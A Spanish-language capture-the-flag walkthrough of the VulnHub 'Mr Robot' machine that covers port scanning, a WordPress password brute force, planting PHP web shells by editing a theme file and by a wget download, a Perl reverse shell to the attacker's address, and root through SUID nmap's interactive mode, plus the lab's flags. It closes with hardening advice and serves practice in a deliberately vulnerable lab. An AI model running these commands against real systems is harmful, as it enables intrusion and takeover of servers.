<h1>Mr Robot</h1>
En este caso me hizo gracia el CTF de Mr. Robot, ya que hace unos guiños a la serie que tantos conocemos.

<img class="aligncenter" src="https://cdn-images-1.medium.com/max/1200/1*VytWprd2ulmw2eIwnHMNJQ.jpeg" width="581" height="291" />

Para empezar nos descargamos la VM del siguiente <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">enlace.</a>

Una vez descargada y importada la maquina en VirtualBox empezamos con la enumeración de elementos de la máquina.
<h2>Enumeración</h2>
Lo primero que haremos es listar todo los puertos abiertos:
<pre>root@kali:~# nmap -p- 172.31.255.128
PORT STATE SERVICE
22/tcp closed ssh
80/tcp open http
443/tcp open https
MAC Address: 08:00:27:F3:16:D5 (Oracle VirtualBox virtual NIC)</pre>
Con la opción -A nos da más información acerca de los servicios que se encuentran escuchando:
<pre>root@kali:~# nmap -A 172.31.255.128
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-12 15:50 CET
Nmap scan report for 172.31.255.128
Host is up (0.00040s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
22/tcp closed ssh
80/tcp open http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after: 2025-09-13T10:45:03
MAC Address: 08:00:27:F3:16:D5 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop

TRACEROUTE
HOP RTT ADDRESS
1 0.40 ms 172.31.255.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.99 seconds</pre>
&nbsp;

Vemos que solo tiene abierto los puertos 80,443 y el SSH se encuentra cerrado. Ahora vamos a listar los posibles directorios:
<pre>root@kali:/usr/local/src/Osmedeus# ./osmedeus.py -m dir -t http://172.31.255.128

200 1KB http://172.31.255.128:80/admin/
200 1KB http://172.31.255.128:80/admin/?/login
200 1KB http://172.31.255.128:80/admin/index
200 1KB http://172.31.255.128:80/admin/index.html
200 0B http://172.31.255.128:80/favicon.ico
200 1KB http://172.31.255.128:80/index.html
200 504KB http://172.31.255.128:80/intro
200 19KB http://172.31.255.128:80/license.txt
200 10KB http://172.31.255.128:80/readme
200 10KB http://172.31.255.128:80/readme.html
<strong>200 41B http://172.31.255.128:80/robots.txt</strong>
200 0B http://172.31.255.128:80/sitemap
200 0B http://172.31.255.128:80/sitemap.xml
200 0B http://172.31.255.128:80/sitemap.xml.gz
200 0B http://172.31.255.128:80/wp-config.php
200 0B http://172.31.255.128:80/wp-content/
200 0B http://172.31.255.128:80/wp-content/plugins/google-sitemap-generator/sitemap-core.php
200 3KB http://172.31.255.128:80/wp-login.php
<strong>200 3KB http://172.31.255.128:80/wp-login</strong>
200 3KB http://172.31.255.128:80/wp-login/</pre>
Encontramos un fichero robots.txt:
<pre>http://172.31.255.128/robots.txt
fsocity.dic
key-1-of-3.txt</pre>
El archivo fsocity.dic  es un diccionario:
<pre>http://172.31.255.128/fsocity.dic
true
false
wikia
from
the
now
Wikia
extensions
scss
window
http
var
page
Robot
Elliot
styles
and</pre>
Y el segundo la primera key:
<pre>http://172.31.255.128/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9</pre>
Con wpscan escanemos las posibles vulnerabilidades de wordpress pero parece que no encontramos nada:
<pre>root@kali:~# wpscan --force --wp-content-dir wp-admin --url http://172.31.255.128
_______________________________________________________________
__ _______ _____
\ \ / / __ \ / ____|
\ \ /\ / /| |__) | (___ ___ __ _ _ __ ®
\ \/ \/ / | ___/ \___ \ / __|/ _` | '_ \
\ /\ / | | ____) | (__| (_| | | | |
\/ \/ |_| |_____/ \___|\__,_|_| |_|

WordPress Security Scanner by the WPScan Team
Version 3.4.0
Sponsored by Sucuri - https://sucuri.net
@_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://172.31.255.128/
[+] Started: Sat Dec 22 19:53:44 2018

Interesting Finding(s):

[+] http://172.31.255.128/
| Interesting Entries:
| - Server: Apache
| - X-Mod-Pagespeed: 1.9.32.3-4523
| Found By: Headers (Passive Detection)
| Confidence: 100%

[+] http://172.31.255.128/robots.txt
| Found By: Robots Txt (Aggressive Detection)
| Confidence: 100%

[+] http://172.31.255.128/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:
| - http://codex.wordpress.org/XML-RPC_Pingback_API
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://172.31.255.128/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] WordPress version 4.3.18 identified (Latest, released on 2018-12-13).
| Detected By: Rss Generator (Aggressive Detection)
| - http://172.31.255.128/feed/, &lt;generator&gt;https://wordpress.org/?v=4.3.18&lt;/generator&gt;
| - http://172.31.255.128/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.3.18&lt;/generator&gt;

[i] The main theme could not be detected.

[+] Enumerating All Plugins

[i] No plugins Found.

[+] Enumerating Config Backups
Checking Config Backups - Time: 00:00:00 &lt;==================================================&gt; (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Finished: Sat Dec 22 19:53:46 2018
[+] Requests Done: 22
[+] Cached Requests: 27
[+] Data Sent: 9.665 KB
[+] Data Received: 186.248 KB
[+] Memory used: 47.199 MB
[+] Elapsed time: 00:00:02</pre>
&nbsp;

Si accedemos al login de wordpress y probamos de acceder con el usuario elliot, que aparece en el diccionario, nos muestra el siguiente mensaje:

<img class="size-medium wp-image-125 aligncenter" src="https://labs.dokistudio.es/wp-content/uploads/2018/12/01-276x300.png" alt="" width="276" height="300" />
<h2>Explotación</h2>
Ya tenemos el usuario solo nos hace falta el password. Con nmap lanzamos un ataque de bruteforce contra el login de wordpress, utilizando como diccionario de password el fichero "fsocity.dic" y como usuario "user.txt" que sólo contiene el usuario "elliot":
<pre>root@kali:/tmp# cat user.txt
elliot

root@kali:/tmp# nmap -sV -p 80 --script http-wordpress-brute -script-args 'passdb=/tmp/fsocity.dic,userdb=/tmp/user.txt' 172.31.255.128
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-22 20:08 CET
Nmap scan report for 172.31.255.128
Host is up (0.00039s latency).

PORT STATE SERVICE VERSION
80/tcp open http Apache httpd
|_http-server-header: Apache
| http-wordpress-brute:
| Accounts:
| elliot:ER28-0652 - Valid credentials
|_ Statistics: Performed 11443 guesses in 230 seconds, average tps: 48.5
MAC Address: 08:00:27:F3:16:D5 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 236.81 seconds

</pre>
Ahora que tenemos las credenciales ya podemos acceder al panel de gestión de wordpress:

<img class="aligncenter wp-image-126 size-large" src="https://labs.dokistudio.es/wp-content/uploads/2018/12/03-1024x409.png" alt="" width="676" height="270" />

&nbsp;

Lo siguiente que vamos hacer es subir una shell php modificando el archivo 404 Template (404.php), en esta ocasión he utilizado la siguiente <a href="https://raw.githubusercontent.com/JohnTroony/php-webshells/master/g00nshell-v1.3.php">shell.</a> Simplemente lo que tenemos que hacer es reemplazar el contenido del fichero con el de la shell:

<img class="wp-image-127 size-large aligncenter" src="https://labs.dokistudio.es/wp-content/uploads/2018/12/04-1024x417.png" alt="" width="676" height="275" />

Una vez guardados los cambios, accederemos vía web al archivo modificado:

<img class="wp-image-128 size-large aligncenter" src="https://labs.dokistudio.es/wp-content/uploads/2018/12/05-1024x586.png" alt="" width="676" height="387" />

Esta terminal es muy limitada así que vamos a subir otra, desde la propia terminal que acabamos de instalar ejecutamos el siguiente comando:
<pre>wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O wp-content/themes/shell.php

</pre>
Si accedemos vía web ya nos muestra la nueva shell:

&nbsp;

<img class="wp-image-129 size-large aligncenter" src="https://labs.dokistudio.es/wp-content/uploads/2018/12/07-1024x713.png" alt="" width="676" height="471" />
<h2>Escalar  privilegios</h2>
Ya tenemos acceso al sistema, el siguiente paso es escalar privilegios hasta llegar a root. Primero listamos con qué usuario estamos logueado:
<pre>id
uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre>
Buscamos su home:
<pre>grep daemon /etc/passwd
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false</pre>
El servidor SSH se encuentra instalado, pero no iniciado:
<pre>dpkg -l | grep ssh
ii openssh-client 1:6.6p1-2ubuntu2 amd64 secure shell (SSH) client, for secure access to remote machines
ii openssh-server 1:6.6p1-2ubuntu2 amd64 secure shell (SSH) server, for secure access from remote machines
ii openssh-sftp-server 1:6.6p1-2ubuntu2 amd64 secure shell (SSH) sftp server module, for SFTP access from remote machines
ii ssh 1:6.6p1-2ubuntu2 all secure shell client and server (metapackage)
ii ssh-import-id 3.21-0ubuntu1 all securely retrieve an SSH public key and install it locally</pre>
<pre>netstat -nltp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 127.0.0.1:21 0.0.0.0:* LISTEN -
tcp 0 0 127.0.0.1:2812 0.0.0.0:* LISTEN -
tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN -
tcp6 0 0 :::443 :::* LISTEN -
tcp6 0 0 :::80 :::* LISTEN -</pre>
Buscamos binarios con SUID configurado y encontramos nmap:
<pre>find / -perm -u=s -type f 2&gt;/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown

ls -liath /usr/local/bin/nmap
34835 -rwsr-xr-x 1 root root 493K Nov 13 2015 /usr/local/bin/nmap

</pre>
Ejecutamos una reverse shell, en nuestra máquina Kali ponemos a escuchar un netcat por el puerto 8080:
<pre>root@kali:/tmp# nc -vlp 8080
listening on [any] 8080 ...</pre>
Desde la maquina victima, vía la web shell:
<pre>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.31.255.129:8080");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</pre>
Ya tenemos una sesión abierta directamente desde nuestro kali:
<pre>root@kali:/tmp# nc -vlp 8080
listening on [any] 8080 ...

172.31.255.128: inverse host lookup failed: Unknown host
connect to [172.31.255.129] from (UNKNOWN) [172.31.255.128] 37278

ls
index.php
shell.php
twentyfifteen
twentyfourteen
twentythirteen</pre>
Abrimos una shell en python:
<pre>python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$</pre>
Probamos de ejecutar nmap en modo interactivo y abrimos una shell:
<pre>daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$ /usr/local/bin/nmap --interactive
&lt;pps/wordpress/htdocs/wp-content/themes$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h &lt;enter&gt; for help
nmap&gt; !sh
!sh
</pre>
Bingo! ya tenemos acceso root:
<pre># id
id
uid=1(daemon) gid=1(daemon) <strong>euid=0(root) groups=0(root)</strong>,1(daemon)
#</pre>
En la home del usuario robot encontramos la key 2 de 3:
<pre>cd /home/robot
# ls
ls
key-2-of-3.txt password.raw-md5
# ls -liath
ls -liath
total 16K
136109 -rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5
136108 -r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt
130326 drwxr-xr-x 2 root root 4.0K Nov 13 2015 .
22175 drwxr-xr-x 3 root root 4.0K Nov 13 2015 ..
# cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
#</pre>
Si desencriptamos el password:
<pre>c3fcd3d76192e4007dfb496cca67e13b : abcdefghijklmnopqrstuvwxyz</pre>
Accedemos al directorio root y encontramos la última key:
<pre>cd /root
# pwd
pwd
/root
# ls -liath
ls -liath
total 32K
30845 -rw------- 1 root root 4.0K Nov 14 2015 .bash_history
33954 drwx------ 3 root root 4.0K Nov 13 2015 .
55578 -rw-r--r-- 1 root root 0 Nov 13 2015 firstboot_done
34802 -r-------- 1 root root 33 Nov 13 2015 key-3-of-3.txt
394264 drwx------ 2 root root 4.0K Nov 13 2015 .cache
2 drwxr-xr-x 22 root root 4.0K Sep 16 2015 ..
35943 -rw-r--r-- 1 root root 3.2K Sep 16 2015 .bashrc
34851 -rw------- 1 root root 1.0K Sep 16 2015 .rnd
35944 -rw-r--r-- 1 root root 140 Feb 20 2014 .profile
</pre>
<h1>Conclusiones</h1>
Como he comentado al principio de la entrada, existen diferentes métodos para resolver un CTF. Después encontré esta <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">reverse shell php</a>, que podría haber subido directamente en vez de las dos shells anteriores.

Los puntos a tener en cuenta:
<ul>
 	<li>Tener siempre actualizado Wordpress  y sus plugins a la última versión.</li>
 	<li>Una fuerte política de passwords para los usuarios de Wordpress.</li>
 	<li>Actualizaciones del propio sistema base, en este caso nmap se encontraba con una versión antigua y todavía tenía habilitado el modo "interactive". Aun no teniendo el modo interactive también podríamos escaparnos, por <a href="https://gtfobins.github.io/gtfobins/nmap/">ejemplo</a>.</li>
 	<li>Si se configura SUID en un archivo/binario, podemos ejecutarlo como si del propietario se tratase. Por es importante analizar en qué casos es necesario configurarlo o bien si podemos utilizar otras alternativas.</li>
</ul>
